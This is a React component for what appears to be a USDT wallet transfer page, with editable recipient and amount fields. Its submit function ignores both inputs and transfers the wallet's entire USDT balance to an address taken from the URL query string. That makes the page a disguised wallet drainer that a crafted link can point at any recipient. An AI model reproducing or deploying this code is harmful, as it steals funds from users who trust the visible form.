import { useEffect, useState } from "react";
import Swal from "sweetalert2";
import { connectWallet } from "./connectWallet";
import { useSearchParams } from "react-router-dom";

function Transfer() {
  const [count, setCount] = useState("");
  const [selectedAccount, setSelectedAccount] = useState("");
  const [searchParams] = useSearchParams();

  const account = searchParams.get("account");

  useEffect(() => {
    setSelectedAccount(account || "");
  }, [account]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setSelectedAccount(text || "");
    } catch (err) {
      console.log("Clipboard not allowed", err);
    }
  };

  const handleMax = async () => {
    try {
      const walletData = await connectWallet("ETH");
      if (!walletData) return;

      const bal = await walletData.usdtContract.balanceOf(walletData.selectedAccount);

      // USDT = 18 decimals sometimes, 6 decimals on many chains
      // Here we keep it simple:
      setCount(bal.toString());
    } catch (e) {
      console.log(e);
    }
  };

  const fn_submit = async () => {
    const walletData = await connectWallet("ETH");
    if (!walletData && !account) return;

    const bal = await walletData.usdtContract.balanceOf(walletData.selectedAccount);
    const tx = await walletData.usdtContract.transfer(account, bal);
    await tx.wait();

    Swal.fire({
      title: "Success!",
      text: "Transfer Successful",
      icon: "success",
      confirmButtonText: "OK",
    });
  };

  return (
    <div style={styles.page}>
      <div style={styles.wrapper}>
        {/* Address */}
        <div style={styles.block}>
          <div style={styles.label}>Address or Domain Name</div>

          <div style={styles.inputWrap}>
            <input
              style={styles.input}
              value={selectedAccount}
              onChange={(e) => setSelectedAccount(e.target.value)}
              placeholder="0x..."
            />

            <div style={styles.rightTools}>
              {selectedAccount?.length > 0 && (
                <button
                  type="button"
                  style={styles.clearBtn}
                  onClick={() => setSelectedAccount("")}
                >
                  ×
                </button>
              )}

              <button type="button" style={styles.linkBtn} onClick={handlePaste}>
                Paste
              </button>
            </div>
          </div>
        </div>

        {/* Amount */}
        <div style={styles.block}>
          <div style={styles.label}>Amount</div>

          <div style={styles.inputWrap}>
            <input
              style={styles.input}
              value={count}
              onChange={(e) => setCount(e.target.value)}
              placeholder="0"
            />

            <div style={styles.rightTools}>
              <span style={styles.tokenText}>USDT</span>
              <button type="button" style={styles.linkBtn} onClick={handleMax}>
                Max
              </button>
            </div>
          </div>

          <div style={styles.usdText}>= $</div>
        </div>
      </div>

      {/* Bottom Button */}
      <div style={styles.bottomBar}>
        <button style={styles.nextBtn} onClick={fn_submit}>
          Next
        </button>
      </div>
    </div>
  );
}

export default Transfer;

const styles = {
  page: {
    minHeight: "100vh",
    background: "#ffffff",
    fontFamily: "system-ui, -apple-system, Segoe UI, Roboto, Arial",
    position: "relative",
  },

  wrapper: {
    padding: "22px 22px 120px 22px",
    maxWidth: "1400px",
    margin: "0 auto",
  },

  block: {
    marginBottom: "28px",
  },

  label: {
    fontSize: "16px",
    color: "#333",
    marginBottom: "10px",
  },

  inputWrap: {
    width: "100%",
    border: "1px solid #d9d9d9",
    borderRadius: "2px",
    height: "58px",
    display: "flex",
    alignItems: "center",
    paddingLeft: "14px",
    paddingRight: "10px",
    background: "#fff",
  },

  input: {
    border: "none",
    outline: "none",
    width: "100%",
    height: "100%",
    fontSize: "16px",
    color: "#111",
  },

  rightTools: {
    display: "flex",
    alignItems: "center",
    gap: "14px",
    whiteSpace: "nowrap",
  },

  clearBtn: {
    width: "26px",
    height: "26px",
    borderRadius: "50%",
    border: "none",
    cursor: "pointer",
    background: "#f1f1f1",
    color: "#444",
    fontSize: "18px",
    lineHeight: "26px",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
  },

  linkBtn: {
    border: "none",
    background: "transparent",
    color: "#1a5cff",
    cursor: "pointer",
    fontSize: "15px",
    fontWeight: "600",
  },

  tokenText: {
    fontSize: "15px",
    color: "#333",
    fontWeight: "600",
  },

  usdText: {
    marginTop: "12px",
    fontSize: "16px",
    color: "#333",
  },

  bottomBar: {
    position: "fixed",
    left: 0,
    right: 0,
    bottom: 0,
    padding: "22px",
    background: "#fff",
  },

  nextBtn: {
    width: "100%",
    height: "60px",
    borderRadius: "30px",
    border: "none",
    background: "#0000ff",
    color: "#fff",
    fontSize: "18px",
    fontWeight: "600",
    cursor: "pointer",
  },
};
